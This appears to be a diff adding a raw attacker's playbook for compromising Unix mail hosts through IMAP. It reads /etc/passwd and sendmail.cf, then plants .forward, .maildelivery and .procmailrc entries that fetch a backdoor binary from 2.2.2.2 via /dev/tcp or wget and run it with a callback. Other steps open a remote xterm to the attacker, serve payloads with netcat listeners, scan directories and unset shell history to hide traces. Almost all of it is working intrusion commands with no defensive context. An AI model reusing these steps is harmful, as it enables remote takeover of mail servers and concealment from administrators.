@@ -1,0 +1,113 @@
+nc -v -l -p 53 < ../up/noserver-sparc-sun-solaris2.5.1 
+noclient  -l 25
+telnet 127.0.0.1 143
+
+A000 LOGIN user password
+A001 EXAMINE /etc/mail/sendmail.cf
+A002 FETCH 1 RFC822
+A003 EXAMINE /etc/passwd
+A004 FETCH 1 RFC822
+A003 EXAMINE /etc/shells
+A004 FETCH 1 RFC822
+A005 EXAMINE .forward
+A006 CREATE .forward
+A007 CREATE .forward
+A008 APPEND .forward (\Seen) {145}
+"| /bin/ksh -c '/bin/cat</dev/tcp/2.2.2.2/53>/tmp/sendmail;chmod +x /tmp/sendmail;D=-c2.2.2.2:25 PATH=/tmp sendmail;rm -f /tmp/sendmail'"
+A009 DELETE .forward
+A010 LOGOUT
+
+telnet 127.0.0.1 25
+HELO helo
+MAIL FROM: user@itt.badguy.net
+RCPT TO: user@itt.badguy.net
+DATA
+.
+QUIT
+
+# echo -e "HTTP/1.0 200\n" > new
+# cat new noserver-2.6.1-i586.pc.linux.gnu.redhat-5.0 > sendmail
+# nc -v -l -p 53 < sendmail
+
+# noclient -l 25
+
+telnet 2.2.2.2 143
+A000 LOGIN user password
+A001 EXAMINE /etc/mail/sendmail.cf
+A002 FETCH 1 RFC822
+A003 EXAMINE /etc/passwd
+A004 FETCH 1 RFC822
+A003 EXAMINE /etc/shells
+A004 FETCH 1 RFC822
+A100 LIST /etc/smrsh *
+A005 EXAMINE .forward
+A006 CREATE .forward
+A007 CREATE .forward
+A008 APPEND .forward (\Seen) {11}
+"| slocal"
+A100 CREATE .maildelivery
+A101 APPEND .maildelivery (\Seen) {37}
+To user pipe A >/home/user/.g
+A102 LIST "" %
+A102 RENAME .g .procmailrc
+A008 APPEND .procmailrc (\Seen) {128}
+:0 c
+|cd /tmp;wget http://2.2.2.2:53/sendmail; chmod +x /tmp/sendmail;D=-c2.2.2.2:25 PATH=/tmp sendmail;rm -f sendmail
+A009 DELETE .forward
+A009 DELETE .maildelivery
+A009 DELETE .procmailrc
+A010 LOGOUT
+
+telnet localhost 25
+HELO helo
+MAIL FROM: user@localhost.localdomain
+RCPT TO: user@localhost.localdomain
+DATA
+.
+QUIT
+
+telnet fawn 143
+A000 LOGIN user password
+A001 EXAMINE /etc/mail/sendmail.cf
+A002 FETCH 1 RFC822
+A003 EXAMINE /etc/passwd
+A004 FETCH 1 RFC822
+A003 EXAMINE /etc/shells
+A004 FETCH 1 RFC822
+A102 LIST "/usr/bin/X11" %
+A005 EXAMINE .forward
+A006 CREATE .forward
+A007 CREATE .forward
+A008 APPEND .forward (\Seen) {50}
+"| /usr/bin/*11/xterm -display 2.2.2.2:26000"
+A009 DELETE .forward
+A010 LOGOUT
+
+telnet fawn 25
+HELO helo
+MAIL FROM: user@fawn.badguy.net
+RCPT TO: user@fawn.badguy.net
+DATA
+.
+QUIT
+
+
+
+/etc/release
+/etc/inetd.conf
+
+001 LIST /tmp *
+001 LIST /etc *
+001 LIST "" %
+001 LIST "/" %
+#* SCAN / * a
+#* SCAN / * .
+# depth scanning
+* SCAN /tmp * .
+* SCAN /etc * .
+* SCAN /etc/passwd * .
+
+unset HISTFILE
+unset HISTFILESIZE
+unset HISTSIZE
+
